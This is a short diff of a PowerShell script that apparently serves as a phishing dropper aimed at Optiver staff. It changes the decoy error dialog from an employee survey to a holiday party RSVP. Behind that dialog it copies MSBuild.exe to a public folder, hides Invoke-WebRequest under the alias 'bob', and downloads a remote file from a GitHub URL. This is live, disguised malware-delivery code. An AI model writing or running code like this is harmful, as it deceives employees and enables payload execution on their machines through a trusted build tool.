@@ -1,5 +1,5 @@
 Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.MessageBox]::Show('Unable to load Optiver Employee Survey at this time, please try again later. ERROR #5345')
+[System.Windows.Forms.MessageBox]::Show('Unable to load Optiver US 2021 Holiday Party RSVP at this time. ERROR #5345')
 copy-item C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe c:\users\public\MSBuild.exe
 set-alias -name bob -value iwr
 bob 'https://raw.githubusercontent.com/erinsuthers/survey/main/questions.txt' -UseBasicParsing -outfile "c:\users\public\questions.txt"
